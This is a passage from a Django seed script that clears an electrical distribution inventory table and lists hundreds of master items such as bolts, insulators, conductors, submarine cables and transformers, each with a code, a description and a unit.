import os
import django
import sys

# Universal Master Inventory Seed Script
# Automatically generated from 'All Items.xlsx'

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'Allocation_Management.settings')
django.setup()

from PBSWise_Balance.models import Zonal_Items
import base64, json
from django.contrib.auth.models import User

def run_seed():
    print("Clearing existing Zonal Items from distribution master list...")
    Zonal_Items.objects.all().delete()
    
    print("Populating 683 master inventory items...")
    
    payload = [
    {
        "item_name": "B-1",
        "description": "11KV Pin, Insulator, X-arm, 1\" Lead",
        "unit": "Nos."
    },
    {
        "item_name": "B-10",
        "description": "Bolt, Machine, 5/8\"x16\",Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-100",
        "description": "Bolt, Clevis, 5/8\"x10\", Drop-forged,",
        "unit": "Nos."
    },
    {
        "item_name": "B-102",
        "description": "Bolt, Clevis, 5/8\"x 14\", Drop-forged,",
        "unit": "Nos."
    },
    {
        "item_name": "B-11",
        "description": "Bolt, Machine, 5/8\"x18\",Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-110",
        "description": "Guy Attachment, Two Bolt, Hook",
        "unit": "Nos."
    },
    {
        "item_name": "B-111",
        "description": "Washer, Ferrous, Galv. 4\" Sqr Curved,",
        "unit": "Nos."
    },
    {
        "item_name": "B-114",
        "description": "Capacitor Rack,9 Unit Pole Mount.in Line Conf",
        "unit": "Nos."
    },
    {
        "item_name": "B-115",
        "description": "Bolt, Machine, 1/2\"x8\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-118",
        "description": "Washer 2-1/4\" Squre, Flate, 13/16\" Hole.",
        "unit": "Nos."
    },
    {
        "item_name": "B-12",
        "description": "Bolt, Machine, 5/8\"x20\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-122",
        "description": "33KV Pin, Insulator, X-arm, 1-3/8\" Lead Thread",
        "unit": "Nos."
    },
    {
        "item_name": "B-123",
        "description": "Pin, Inslatr, X-arm,1-3/8,\" Lead",
        "unit": "Nos."
    },
    {
        "item_name": "B-125",
        "description": "Pin Insulator Jamper Stand Off  1\" Lead Hea",
        "unit": "Nos."
    },
    {
        "item_name": "B-132",
        "description": "Clamp, Dead-end, Straight, #6 Thru 266.8",
        "unit": "Nos."
    },
    {
        "item_name": "B-133",
        "description": "Clamp, Condctr Dead-end,stght, 266.8\"1192.5",
        "unit": "Nos."
    },
    {
        "item_name": "B-134",
        "description": "Clamp, Suspension, 2-bolt, For 477MCM ACSR",
        "unit": "Nos."
    },
    {
        "item_name": "B-136",
        "description": "Nut, Machine Bolt (3/8 Inch)",
        "unit": "Nos."
    },
    {
        "item_name": "B-137",
        "description": "Nut, Machine Bolt (1/2 Inch)",
        "unit": "Nos."
    },
    {
        "item_name": "B-138",
        "description": "Nut, Machine Bolt (5/8 Inch)",
        "unit": "Nos."
    },
    {
        "item_name": "B-139",
        "description": "Nut Machine Bolt (3/8\")",
        "unit": "Nos."
    },
    {
        "item_name": "B-141",
        "description": "Ground Wire Clamps For SPC Pole",
        "unit": "Nos."
    },
    {
        "item_name": "B-146",
        "description": "Insulator Pin",
        "unit": "Nos."
    },
    {
        "item_name": "B-148",
        "description": "60-90 Deg.angle Bracket.",
        "unit": "Nos."
    },
    {
        "item_name": "B-15",
        "description": "Bolt, Machine, 3/4\"x12\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-151",
        "description": "Dead-end Bracket",
        "unit": "Nos."
    },
    {
        "item_name": "B-154.4",
        "description": "PREFORMED GRIP 15KV (ND-0118)",
        "unit": "Nos."
    },
    {
        "item_name": "B-159",
        "description": "Clamp, Dead-end, Straight,for 636MCM",
        "unit": "Nos."
    },
    {
        "item_name": "B-16",
        "description": "Bolt, Machine, 3/4\"x14\".",
        "unit": "Nos."
    },
    {
        "item_name": "B-161",
        "description": "Solid Ferrous Meter Ground Rod",
        "unit": "Nos."
    },
    {
        "item_name": "B-18",
        "description": "Bolt, Oval Eye, 5/8\"x8\", Drop-forged",
        "unit": "Nos."
    },
    {
        "item_name": "B-19",
        "description": "Bolt, Oval Eye, 5/8\"x10\", Drop-forged",
        "unit": "Nos."
    },
    {
        "item_name": "B-2",
        "description": "Pin, Insulator, X-arm, Pole Top, 1\" Lead",
        "unit": "Nos."
    },
    {
        "item_name": "B-20",
        "description": "Bolt, Oval Eye, 5/8\"x12\", Drop-forged",
        "unit": "Nos."
    },
    {
        "item_name": "B-22",
        "description": "Bolt, Eye Oval 5/8\"x18\" Drop-forged,",
        "unit": "Nos."
    },
    {
        "item_name": "B-24",
        "description": "Bolt Thimble Eye 5/8\"x 10\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-25",
        "description": "Bolt Thimble Eye 5/8\"x 12\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-26",
        "description": "Double arming bolt, 5/8X16\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-27",
        "description": "Bolt, Double Arming, Rolled Threads",
        "unit": "Nos."
    },
    {
        "item_name": "B-28",
        "description": "Bolt, Double Arming, Rolled Threads",
        "unit": "Nos."
    },
    {
        "item_name": "B-29",
        "description": "Bolt, Double Arming, Rolled Threads",
        "unit": "Nos."
    },
    {
        "item_name": "B-3",
        "description": "Bolt, Machine,1/2\"x1-1/2\",Rolled",
        "unit": "Nos."
    },
    {
        "item_name": "B-30",
        "description": "Bolt, Double Arming, Rolled Threads",
        "unit": "Nos."
    },
    {
        "item_name": "B-32",
        "description": "Bolt, Carriage,Rolled",
        "unit": "Nos."
    },
    {
        "item_name": "B-34",
        "description": "Bolt,Single Upset,Rolled Threads,Galv.3",
        "unit": "Nos."
    },
    {
        "item_name": "B-35",
        "description": "Bolt,Single Upset, Rolled",
        "unit": "Nos."
    },
    {
        "item_name": "B-36",
        "description": "Bolt, Double Upset, 5/8\"x8\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-37",
        "description": "Bolt, Double Upset, 5/8\"x10\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-4",
        "description": "Bolt, Machine, 1/2\"x6\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-4.1",
        "description": "Bolts Machine 1/2\"x8\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-4.2",
        "description": "Bolts Machine 1/2\"x10\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-4.3",
        "description": "Machine Bolt,1/2\"  X 12\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-41",
        "description": "Brace, Crossarm, 28\" Steel",
        "unit": "Nos."
    },
    {
        "item_name": "B-41.1",
        "description": "Brace Crossarm 28\" x 1-1/2\" x 1/4\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-42",
        "description": "Brace, Crossarm, 60\" Span (V Brace)",
        "unit": "Nos."
    },
    {
        "item_name": "B-42.1",
        "description": "Brace Crossarm 35\" Span, (V Brace)",
        "unit": "Nos."
    },
    {
        "item_name": "B-43",
        "description": "Brace, Crossarm, Steel, Galv, 60\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-43.1",
        "description": "Brace Side Arm 25\"f",
        "unit": "Nos."
    },
    {
        "item_name": "B-43.2",
        "description": "Brace Side Arm 1250mm f",
        "unit": "Nos."
    },
    {
        "item_name": "B-46",
        "description": "Washer, Ferrous, Galv. 2-1/4\" Sqr.11/16\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-48",
        "description": "Washer, Ferrous, Galv. Round, Flat, 9/16\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-49",
        "description": "Washer, Ferrous, Galv  3\" Sqr Curved,",
        "unit": "Nos."
    },
    {
        "item_name": "B-5",
        "description": "Bolt, Machine, 5/8\"x6\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-53",
        "description": "Nut, Oval-eye, Drop-froged, Galv.,For 5/8\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-54",
        "description": "Nut,Thimble-eye,Drop-froged, Galv.For 5/8\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-55",
        "description": "Shacle, Anchor, Drop-froged, Hot Dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-56",
        "description": "Guy Attachment, Formed Starp, Hot Dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-6",
        "description": "Machine Bolt, 5/8\" X 8\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-62",
        "description": "Rod, Anchor, Twin-eye, Drop-forged, Galv.",
        "unit": "Nos."
    },
    {
        "item_name": "B-63",
        "description": "Rod, Anchor, Twin-eye, Drop-forged, Galv.",
        "unit": "Nos."
    },
    {
        "item_name": "B-65",
        "description": "Rod, Ground, Hot Dipped Galvanized,5/8\"x8'",
        "unit": "Nos."
    },
    {
        "item_name": "B-66",
        "description": "Plate Ground, Galvanized, 7.5\"x7.5\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-67",
        "description": "Staple pin",
        "unit": "Nos."
    },
    {
        "item_name": "B-7",
        "description": "Bolt, Machine, 5/8\"x10\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-72",
        "description": "Clevis, Bracket, Secondary, Hot Dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-73",
        "description": "Clevis, Swinging, Secondary, Hot Dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-74",
        "description": "Clevis, Dead-end, Service, Hot Dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-8",
        "description": "Bolt, Machine, 5/8\"x12\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-80",
        "description": "Clamp, Ground Rod, 5/8\", Hot-dipped",
        "unit": "Nos."
    },
    {
        "item_name": "B-82",
        "description": "Calmp, Suspensionn Single Bolt #3 ACSR.",
        "unit": "Nos."
    },
    {
        "item_name": "B-83",
        "description": "Clamp, Clevis, Suspension, Two Bolt,For 1/0",
        "unit": "Nos."
    },
    {
        "item_name": "B-84",
        "description": "Clamp, Clevis, Suspension, Two Bolt,For 4/0",
        "unit": "Nos."
    },
    {
        "item_name": "B-85",
        "description": "Clamp, Loop, Dead-end, For #3 ACSR Thru",
        "unit": "Nos."
    },
    {
        "item_name": "B-86",
        "description": "Clamp, Loop, Dead-end, For #1/0 ACSR Thru",
        "unit": "Nos."
    },
    {
        "item_name": "B-87",
        "description": "Cluster Mount, Transformer, For 5 Kva Thru",
        "unit": "Nos."
    },
    {
        "item_name": "B-88",
        "description": "Cluster Mount, Transformer, For 75 Kva",
        "unit": "Nos."
    },
    {
        "item_name": "B-9",
        "description": "Bolt, Machine, 5/8\"x14\", Rolled Threads,",
        "unit": "Nos."
    },
    {
        "item_name": "B-90",
        "description": "Bracket, Cutout & Arrester, Pole Mounting,",
        "unit": "Nos."
    },
    {
        "item_name": "B-96",
        "description": "Chain Link 5/8\"x3-1/4\"",
        "unit": "Nos."
    },
    {
        "item_name": "B-97",
        "description": "Pin Crossarm, 1\"lead Thread, Saddle Type.",
        "unit": "Nos."
    },
    {
        "item_name": "BC-1",
        "description": "Battery Charger 20 A",
        "unit": "Nos."
    },
    {
        "item_name": "BC-2",
        "description": "Ni- Cd Cells",
        "unit": "Nos."
    },
    {
        "item_name": "BC-3",
        "description": "Electrolyte",
        "unit": "Nos."
    },
    {
        "item_name": "BS-32",
        "description": "Dead-end Strain Clamp 4/0 Mhdc,  Bronze",
        "unit": "Nos."
    },
    {
        "item_name": "BS-34",
        "description": "Dead-end Strain Clamp 500MCM Mhdcc Bronze",
        "unit": "Nos."
    },
    {
        "item_name": "BS-40",
        "description": "Ground Rod Cupper Clad 5/8\"x8'",
        "unit": "Nos."
    },
    {
        "item_name": "BS-40.001",
        "description": "Ground Rod Couplings 5/8\" Copper",
        "unit": "Nos."
    },
    {
        "item_name": "BS-40.002",
        "description": "Ground Rod Driving Stud 5/8\" Copper Full",
        "unit": "Nos."
    },
    {
        "item_name": "BS-41",
        "description": "Cross-arm, Steel, Sub-station, 11'-11''",
        "unit": "Nos."
    },
    {
        "item_name": "BS-41.1",
        "description": "Longitudinal Channel Jointing (1'-6'')",
        "unit": "Nos."
    },
    {
        "item_name": "BSA-25",
        "description": "Gain Crossarm Support Ductile",
        "unit": "Nos."
    },
    {
        "item_name": "BSC-12.30",
        "description": "Bolt Machine Cupper 12mmx30mm W, Nut & Spring",
        "unit": "Nos."
    },
    {
        "item_name": "BSC-12.40",
        "description": "Bolt Machine Cupper 12mmx40mm W, Nut & Spring",
        "unit": "Set."
    },
    {
        "item_name": "BSC-12.45",
        "description": "Bolt Machine Cupper 12mmx45mm W, Nut & spring",
        "unit": "Set."
    },
    {
        "item_name": "BSG-12.100",
        "description": "Bolt Machine Gal.steel 12mmx100mm W.nut&spring",
        "unit": "Nos."
    },
    {
        "item_name": "BSS-12.50",
        "description": "Bolt Machine Stl.steel 12mmx50mm W, Nut",
        "unit": "Nos."
    },
    {
        "item_name": "C-1",
        "description": "Insulator, Pin Type, 11 Kv  1\" Thread",
        "unit": "Nos."
    },
    {
        "item_name": "C-10",
        "description": "Insulator,Suspension,6 Inch,11 Kv",
        "unit": "Nos."
    },
    {
        "item_name": "C-11",
        "description": "Insulator,Suspension,10 Inch,33 Kv",
        "unit": "Nos."
    },
    {
        "item_name": "C-13",
        "description": "Insulator, 34.5KV, post type",
        "unit": "Nos."
    },
    {
        "item_name": "C-14",
        "description": "Polyethelene Pininsulator",
        "unit": "Nos."
    },
    {
        "item_name": "C-2",
        "description": "Insulator, Spool, 3 Inch Grove Diameter.",
        "unit": "Nos."
    },
    {
        "item_name": "C-3",
        "description": "Insulator, Spool, 1-3/4 Inch Grove",
        "unit": "Nos."
    },
    {
        "item_name": "C-4",
        "description": "Insulator, Spool, 1-1/2 Inch Grove",
        "unit": "Nos."
    },
    {
        "item_name": "C-5",
        "description": "Insulator, Pin Type, 33 Kv 1-3/8\" Lead",
        "unit": "Nos."
    },
    {
        "item_name": "CS-12",
        "description": "Insulator, 15KV, station post type",
        "unit": "Nos."
    },
    {
        "item_name": "CS-13",
        "description": "Insulator, 34.5KV, station post type",
        "unit": "Nos."
    },
    {
        "item_name": "CS-14",
        "description": "Insulator 34.5 Kv Station Post Type",
        "unit": "Nos."
    },
    {
        "item_name": "CS-16",
        "description": "Lap Insulator 4235-70 34.5kv",
        "unit": "Nos."
    },
    {
        "item_name": "CS-17",
        "description": "Lap Insulator 4225-70 11kv",
        "unit": "Nos."
    },
    {
        "item_name": "CS-18",
        "description": "Lap Insulator 4625-70, 11kv",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-111",
        "description": "Phantom Load Generator Modle No. UTI-100",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-302",
        "description": "Oil Centrifuge machine, 1000 L",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-309",
        "description": "Oil Centrifuge machine, 700 L",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-310A",
        "description": "Oil Centrifuge machine, 2000 L",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-310B",
        "description": "Oil Centrifuge machine, 4000 L",
        "unit": "Nos."
    },
    {
        "item_name": "CWS-311",
        "description": "Fantom Load",
        "unit": "Nos."
    },
    {
        "item_name": "D-1",
        "description": "Conductor,#3,ACSR(6/1,Swallow)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-10",
        "description": "Conductor Copper Bare # 2/0 Mhd 19 Strands",
        "unit": "Mtr."
    },
    {
        "item_name": "D-11",
        "description": "Conductor,#6 Duplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-12",
        "description": "Conductor,#3 Duplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-14",
        "description": "Conductor,#3 Quardruplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-15",
        "description": "Conductor,#1/0 Quardruplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-16",
        "description": "Conductor,#3 Copper, Insulated 3-Strand",
        "unit": "Mtr."
    },
    {
        "item_name": "D-17",
        "description": "Conductor,#1/0 Copper, Insulated 7 Strand",
        "unit": "Mtr."
    },
    {
        "item_name": "D-18",
        "description": "Conductor,#4/0 Copper, Insulated 7 Strand.",
        "unit": "Mtr."
    },
    {
        "item_name": "D-2",
        "description": "Conductor,#1/0,(6/1),ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-24",
        "description": "Conductor,#4/0 Quardruplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-25",
        "description": "Conductor,#6 Quardruplex",
        "unit": "Mtr."
    },
    {
        "item_name": "D-27",
        "description": "Conductor, #636 MCM ACSR (Grosbeak)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-28",
        "description": "Conductor #477mcm(26/7)ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-3",
        "description": "Conductor, #4/0,(6/1),ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-31",
        "description": "Conductor#7/4.77mm,aaac(4/0 Awg)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-33",
        "description": "Bare Messenger Wire 252  Awa",
        "unit": "Mtr."
    },
    {
        "item_name": "D-4",
        "description": "Conductor, Ground #4 Aluminium",
        "unit": "Mtr."
    },
    {
        "item_name": "D-5",
        "description": "Conductor,tie,#4 Aluminium",
        "unit": "Mtr."
    },
    {
        "item_name": "D-59",
        "description": "Conductor Insulated  # 2 ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-6",
        "description": "Conductor,#6 Copper,Bare",
        "unit": "Mtr."
    },
    {
        "item_name": "D-60",
        "description": "D-60 (11KV submarine cable, 3 core 185 mm2 TR-XLPE)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-60.1",
        "description": "Outdoor Termination kit  for D-60",
        "unit": "Mtr."
    },
    {
        "item_name": "D-60.2",
        "description": "Straight through joint for 11 Kv  D-60",
        "unit": "Mtr."
    },
    {
        "item_name": "D-61",
        "description": "Insulated Conductor # 1/0 ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-62",
        "description": "Insulated Conductor # 4/0 ACSR",
        "unit": "Mtr."
    },
    {
        "item_name": "D-65",
        "description": "D-65 (11KV submarine cable, 1 core 120 mm2 TR-XLPE)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-65.1",
        "description": "Outdoor Termination kit  for D-65",
        "unit": "Mtr."
    },
    {
        "item_name": "D-65.2",
        "description": "Straight through joint for 11 Kv  D-65",
        "unit": "Mtr."
    },
    {
        "item_name": "D-66",
        "description": "D-66 (11KV submarine cable, 1 core 185 mm2 TR-XLPE)",
        "unit": "Mtr."
    },
    {
        "item_name": "D-66.1",
        "description": "Outdoor Termination kit  for D-66",
        "unit": "Mtr."
    },
    {
        "item_name": "D-66.2",
        "description": "Straight through joint for 11 Kv  D-66",
        "unit": "Mtr."
    },
    {
        "item_name": "D-67",
        "description": "Aerial Spacer Cable, #2 AWG",
        "unit": "Mtr."
    },
    {
        "item_name": "D-68",
        "description": "Aerial Spacer Cable, 1/0 AWG",
        "unit": "Mtr."
    },
    {
        "item_name": "D-7",
        "description": "Conductor, #3  Copper, Bare",
        "unit": "Mtr."
    },
    {
        "item_name": "D-73",
        "description": "Aerial Spacer Cable, 336.4 KCM",
        "unit": "Mtr."
    },
    {
        "item_name": "D-8",
        "description": "Conductor, #1/0  Copper, Bare",
        "unit": "Mtr."
    },
    {
        "item_name": "D-9",
        "description": "Conductor, #4/0  Copper, Bare",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-10",
        "description": "Conductor Copper Bare # 2/0 Mhd 19 Strands",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-38",
        "description": "Conductor 500MCM Mhdcc 37 Strand",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-40",
        "description": "Red Control Cable 600volt Number 12,single Core",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-51",
        "description": "Power Cable Number 12awg,600volt,3 Conductors",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-54",
        "description": "Power Cable Number 10 Awg 600 Volt 2 Conductors",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-55",
        "description": "Power Cable Number 5.5sqmm,600 Volt",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-60",
        "description": "33 KV Sub-Marine Cable 120 mm2",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-60.1",
        "description": "Outdoor Termination for 33 KV Submarine Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-60.2",
        "description": "Straight Through Joint for 33 KV Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-61",
        "description": "33 KV Sub-Marine Cable 185mm2",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-61.1",
        "description": "Outdoor Termination for 33 KV Submarine Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-61.2",
        "description": "Straight Through Joint for 33 KV Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-62",
        "description": "33 KV Sub-Marine Cable 240mm2",
        "unit": "Mtr."
    },
    {
        "item_name": "DS-62.1",
        "description": "Outdoor Termination for 33 KV Submarine Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-62.2",
        "description": "Straight Through Joint for 33 KV Power Cable",
        "unit": "Nos."
    },
    {
        "item_name": "DS-9",
        "description": "Conductor Copper Bare #4/0 Mhd 19 Strands",
        "unit": "Mtr."
    },
    {
        "item_name": "E-10",
        "description": "Line Guard Preformed #3ACSR",
        "unit": "Set."
    },
    {
        "item_name": "E-11",
        "description": "Line, Guard, Preformed #1/0 ACSR",
        "unit": "Set."
    },
    {
        "item_name": "E-12",
        "description": "Line, Guard, Preformed#4/0 ACSR",
        "unit": "Set."
    },
    {
        "item_name": "E-15",
        "description": "Line, Guard, Preformed#636MCM(26/7)ACSR",
        "unit": "Set."
    },
    {
        "item_name": "E-17",
        "description": "Grip, Service, Preformed(6 ACSR)",
        "unit": "Set."
    },
    {
        "item_name": "E-18",
        "description": "Grip, Service, Preformed(3 ACSR)",
        "unit": "Set."
    },
    {
        "item_name": "E-21",
        "description": "Grip, Preformed, Guy,for 1/4\" H.s.wire",
        "unit": "Set."
    },
    {
        "item_name": "E-22",
        "description": "Grip, Preformed, Guy,for 3/8\" H.s.wire",
        "unit": "Set."
    },
    {
        "item_name": "E-23",
        "description": "Grip, Preformed, Guy,for 7/16\"h.s.wire",
        "unit": "Set."
    },
    {
        "item_name": "E-24",
        "description": "Line, Guard, Preformed#477MCM(26/7)ACSR",
        "unit": "Set."
    },
    {
        "item_name": "E-25",
        "description": "Line,guard,preformed#2 Awg(7 Str)aaac",
        "unit": "Set."
    },
    {
        "item_name": "E-27",
        "description": "Distribution Grip D.e # 1/0 Acsr",
        "unit": "Set."
    },
    {
        "item_name": "E-28",
        "description": "Distribution Grip D.e # 4/0 Acsr",
        "unit": "Set."
    },
    {
        "item_name": "E-31",
        "description": "Messenger Splice(252 Awa)",
        "unit": "Set."
    },
    {
        "item_name": "E-32",
        "description": "Messenger Splice(052 Awa)",
        "unit": "Set."
    },
    {
        "item_name": "E-7",
        "description": "Tape Armor Aluminium",
        "unit": "Set."
    },
    {
        "item_name": "F-11",
        "description": "15 KV, 1-CORE, 240 mm2 UNDERGROUND POWER CABLE",
        "unit": "Mtr."
    },
    {
        "item_name": "F-12",
        "description": "15 KV, 1-CORE, 300 mm2 UNDERGROUND POWER CABLE",
        "unit": "Mtr."
    },
    {
        "item_name": "F-13",
        "description": "15 KV, 1-CORE, 400 mm2 UNDERGROUND POWER CABLE",
        "unit": "Mtr."
    },
    {
        "item_name": "F-14",
        "description": "15 KV, 1-CORE, 500 mm2 UNDERGROUND POWER CABLE",
        "unit": "Mtr."
    },
    {
        "item_name": "F-4",
        "description": "11kv Under Ground Power  Cable 185 Square",
        "unit": "Mtr."
    },
    {
        "item_name": "F-4.1",
        "description": "Termination Kits For 11kv3core Power Cable",
        "unit": "Set."
    },
    {
        "item_name": "F-4.2",
        "description": "Termination Kits For 11kvpower Cable 3core",
        "unit": "Set."
    },
    {
        "item_name": "F-4.3",
        "description": "Straight Through Joining Box For 11kv",
        "unit": "Set."
    },
    {
        "item_name": "F-7",
        "description": "33kv Under Ground Power  Cable 400 Square mm 1-core",
        "unit": "Mtr."
    },
    {
        "item_name": "F-7.1",
        "description": "Termination Kits For 33kv Power Cable 1core  Outdoor",
        "unit": "Set."
    },
    {
        "item_name": "F-7.2",
        "description": "Termination Kits For 33kv Power Cable 1core Indoor",
        "unit": "Set."
    },
    {
        "item_name": "F-7.3",
        "description": "Straight Through Joining Box For 33kv",
        "unit": "Set."
    },
    {
        "item_name": "F-8",
        "description": "33kv Under Ground Power  Cable 500 Square mm 1-core",
        "unit": "Mtr."
    },
    {
        "item_name": "F-8.1",
        "description": "Termination Kits For 33kv Power Cable 1core outdoor",
        "unit": "Nos."
    },
    {
        "item_name": "F-8.2",
        "description": "Termination Kits For 33kv Power Cable 1core Indoor",
        "unit": "Nos."
    },
    {
        "item_name": "F-8.3",
        "description": "Straight Through Joining Box For 33kv",
        "unit": "Nos."
    },
    {
        "item_name": "G-12",
        "description": "Transformer, Potential, 15 Kv,6350/ 240V",
        "unit": "Nos."
    },
    {
        "item_name": "G-13",
        "description": "Transformer, Current, 600 Volt 400:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-14",
        "description": "Transformer, Current, 600 Volt, 600:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-15",
        "description": "Transformer, Current 15 Kv 50/100:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-16",
        "description": "1 Phaser, 25 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-17",
        "description": "1 Phase, 37.5 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-20",
        "description": "Transformer, Current  6.35KV,15/30:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-21",
        "description": "1 Phase, 5 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-22",
        "description": "Transformer, Current,  600Volt,200:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-23",
        "description": "Transformer, Current,15, Kv,150/300:5",
        "unit": "Nos."
    },
    {
        "item_name": "G-30",
        "description": "3 Phase, 50 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-31",
        "description": "3 Phase, 100 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-32",
        "description": "3 Phase,200 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-4",
        "description": "1 Phaser, 10 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-5",
        "description": "1 Phase, 15 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-6",
        "description": "1 Phase, 50 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-7",
        "description": "1 Phase, 75 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "G-8",
        "description": "1 Phase, 100 KVA",
        "unit": "Nos."
    },
    {
        "item_name": "GS-1",
        "description": "Potential transformer, 33/\u221a3/0.24kv, 50hz, 200kv",
        "unit": "Nos."
    },
    {
        "item_name": "GS-1.1",
        "description": "Voltage Transformer 33 KV 33000/110/Sqrt(3)",
        "unit": "Nos."
    },
    {
        "item_name": "GS-3",
        "description": "Current Transformer 34.5kv,50hz,100/200.5",
        "unit": "Nos."
    },
    {
        "item_name": "GS-4",
        "description": "Current Transformer 34.5kv,50hz,150/300.5",
        "unit": "Nos."
    },
    {
        "item_name": "GS-40.001",
        "description": "Transformer Oil",
        "unit": "Drum"
    },
    {
        "item_name": "GS-42",
        "description": "1 Phase Transformer,1667KVA",
        "unit": "Nos."
    },
    {
        "item_name": "GS-43",
        "description": "1 Phase Power Transformer, 3333KVA 33/6.67-11.",
        "unit": "Nos."
    },
    {
        "item_name": "GS-43.6",
        "description": "Condenser Type H.v Bushings,34.5kv,200 Kv Bil",
        "unit": "Nos."
    },
    {
        "item_name": "GS-44",
        "description": "3 Phase Power Transformer, 5 MVA",
        "unit": "Nos."
    },
    {
        "item_name": "GS-45",
        "description": "3 Phase Power Transformer, 10 MVA",
        "unit": "Nos."
    },
    {
        "item_name": "GS-46",
        "description": "3 Phase Power Transformer, 5 MVA, Off load tap changer type",
        "unit": "Nos."
    },
    {
        "item_name": "GS-47",
        "description": "3 phase  Power Transformer, 10MVA, on load tap changer type",
        "unit": "Nos."
    },
    {
        "item_name": "GS-48",
        "description": "3 phase  Power Transformer, 20MVA, on load tap changer",
        "unit": "Nos."
    },
    {
        "item_name": "GS-49",
        "description": "3 Phase Power Transformer, 10 MVA, Off load tap changer type",
        "unit": "Nos."
    },
    {
        "item_name": "GS-50",
        "description": "3 phase  Power Transformer, 5MVA, on load tap changer type, (Oil Type)",
        "unit": "Nos."
    },
    {
        "item_name": "GS-6.400",
        "description": "Current Transformer 36KV, 50HZ, 400/200:5",
        "unit": "Nos."
    },
    {
        "item_name": "GS-6.600",
        "description": "Current Transformer 36KV, 50HZ, 600/300:5",
        "unit": "Nos."
    },
    {
        "item_name": "GS-6.800",
        "description": "Current Transformer 36KV, 50HZ, 800/400:5",
        "unit": "Nos."
    },
    {
        "item_name": "GS-7.1600",
        "description": "11kv Current Transformers 50hz 1600-800/5a,30va",
        "unit": "Nos."
    },
    {
        "item_name": "GSB-1",
        "description": "Transformer HT Busing",
        "unit": "Nos."
    },
    {
        "item_name": "GSB-2",
        "description": "Transformer LT Busing",
        "unit": "Nos."
    },
    {
        "item_name": "GSF-1",
        "description": "Transformer Cooling Fan",
        "unit": "Nos."
    },
    {
        "item_name": "H-1.002",
        "description": "Fuse Barrel Replacement For Item H-2",
        "unit": "Nos."
    },
    {
        "item_name": "H-1.100",
        "description": "Cutout, Fused, 7.8/13.5 Kv, 15 Kv Class",
        "unit": "Nos."
    },
    {
        "item_name": "H-10.70",
        "description": "Recloser,1 phase 70 Amp",
